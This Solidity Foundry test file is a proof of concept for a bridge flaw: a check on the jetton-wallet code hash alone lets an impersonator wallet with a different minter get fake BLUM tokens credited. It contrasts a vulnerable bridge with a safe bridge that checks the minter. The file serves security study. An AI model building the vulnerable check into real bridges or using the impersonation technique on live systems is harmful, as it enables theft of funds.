// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {
    JettonWallet,
    VulnerableJettonBridge,
    SafeJettonBridge
} from "../src/bridge/JettonImpersonation.sol";

/// PoC for the TAC Bridge jetton-wallet code-hash verification bypass ($2.85M, 2026-05-11).
///   forge test --match-contract JettonImpersonation -vvv
///
/// Invariant (SC02): an inbound bridge message must originate from a wallet with BOTH the
/// correct code hash AND the correct minter/master binding for the claimed asset. Code-hash
/// alone is structural, not contextual — it cannot prove WHICH minter a wallet belongs to.
///
/// See docs/exploits/tac-bridge-jetton-impersonation-2026-05-11.md
contract JettonImpersonationTest is Test {
    address legitMinter = makeAddr("blumMaster"); // canonical BLUM minter
    address attackerMinter = makeAddr("attackerMinter");
    address attacker = makeAddr("attacker");

    /// The crux: an impersonator wallet has an IDENTICAL code hash but a different minter.
    function test_impersonator_hasIdenticalCodeHash() public {
        JettonWallet legit = new JettonWallet(legitMinter);
        JettonWallet evil = new JettonWallet(attackerMinter);
        assertEq(address(evil).codehash, address(legit).codehash, "code hashes are identical");
        assertTrue(evil.minter() != legit.minter(), "but minters differ");
    }

    function test_vulnerable_acceptsImpersonatorWallet() public {
        // A genuine wallet (bound to the canonical minter) defines the canonical code hash.
        JettonWallet legit = new JettonWallet(legitMinter);
        VulnerableJettonBridge bridge = new VulnerableJettonBridge(address(legit).codehash);

        // Attacker deploys a wallet with the SAME code hash but their own minter.
        JettonWallet evil = new JettonWallet(attackerMinter);
        assertEq(address(evil).codehash, bridge.canonicalWalletHash(), "passes the code-hash gate");

        // Attacker bridges 302M fake BLUM through the impersonator — the bridge accepts it.
        vm.prank(attacker);
        bridge.deposit(address(evil), "BLUM", 302_000_000e9);

        assertEq(
            bridge.credited(attacker, "BLUM"),
            302_000_000e9,
            "vulnerable bridge credited fake BLUM minted by an impersonator wallet"
        );
    }

    function test_safe_rejectsImpersonator_acceptsGenuine() public {
        JettonWallet legit = new JettonWallet(legitMinter);
        SafeJettonBridge bridge = new SafeJettonBridge(address(legit).codehash);
        bridge.setCanonicalMinter("BLUM", legitMinter);

        // Impersonator: identical code hash, wrong minter -> rejected by the provenance check.
        JettonWallet evil = new JettonWallet(attackerMinter);
        vm.prank(attacker);
        vm.expectRevert(bytes("wrong minter"));
        bridge.deposit(address(evil), "BLUM", 302_000_000e9);

        // A genuine wallet bound to the canonical minter is accepted.
        vm.prank(attacker);
        bridge.deposit(address(legit), "BLUM", 100e9);
        assertEq(bridge.credited(attacker, "BLUM"), 100e9, "genuine deposit credited");

        // An unknown asset (no canonical minter set) is rejected too.
        vm.prank(attacker);
        vm.expectRevert(bytes("unknown asset"));
        bridge.deposit(address(legit), "GHOST", 1e9);
    }
}
